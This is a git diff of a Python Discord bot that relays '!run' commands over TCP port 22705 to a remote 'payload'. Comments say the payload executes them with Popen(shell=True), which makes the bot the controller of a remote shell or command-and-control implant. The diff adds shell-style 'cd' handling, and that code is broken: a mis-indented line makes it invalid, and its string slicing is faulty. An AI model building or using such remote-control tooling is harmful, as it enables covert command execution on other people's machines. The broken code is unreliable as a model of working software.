@@ -17,6 +17,7 @@ bot = commands.Bot(command_prefix='!')
 
 @bot.command()
 async def run(ctx, *args):
+    global cwd
     ##################################################input
     cmd = ''
     for bit in args:
@@ -27,17 +28,26 @@ async def run(ctx, *args):
     #todo pull out specific character and replace with password from PPM
 
     ##################################################directory services
-    #todo save directory of last command to enable usage like a shell
+    if cwd == None:
+        cwd = '/'
+    if cmd[0:2] == 'cd':
+        if cwd.rfind('/') == -1:
+            print('Error: no / in directory string...')
+        if cmd[1:-1] == '..' or cmd[2:-1] == '..': #handle cd.. or cd ..
+            cwd = cwd[0 : cwd.rfind('/')]
+        elif cmd[3] == '/': #handle cd /etc
+        cwd = cmd
+
 
     ##################################################send to remote
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  #send greeting to command server
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  #send command to payload
         print('Sending command to payload @ ' + remoteAddr[0])
         s.connect((remoteAddr[0], 22705))
         s.sendall(bytes(cmd, 'utf-8'))
 
         ##this is what the remote payload does
         #command = shlex.split(cmd)
-        #process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
+        #process = Popen(command, cwd=DIR, shell=True, stdout=PIPE, stderr=PIPE)
         #stdout, stderr = process.communicate()
 
         data = s.recv(1024)
